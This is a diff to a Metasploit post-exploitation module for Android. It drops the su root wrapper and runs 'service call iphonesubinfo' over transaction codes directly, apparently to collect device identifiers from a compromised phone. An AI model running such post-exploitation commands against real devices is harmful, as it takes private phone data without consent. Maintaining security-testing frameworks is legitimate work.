@@ -22,9 +22,6 @@ class MetasploitModule < Msf::Post
         'Platform'       => 'android',
       }
     ))
-    register_options([
-      OptString.new('SU_BINARY', [true, 'The su binary to execute root commands', 'su'])
-    ])
   end
 
   def run
@@ -64,8 +61,7 @@ class MetasploitModule < Msf::Post
     for code in 1..@transaction_codes.length do
       print_status("using code : #{code}")
       cmd = "service call iphonesubinfo #{code}"
-      su_cmd = "#{datastore['SU_BINARY']} -c #{cmd}"
-      block = cmd_exec(su_cmd)
+      block = cmd_exec(cmd)
       value,tc = get_val(block, code)
       arr << [tc, value]
     end
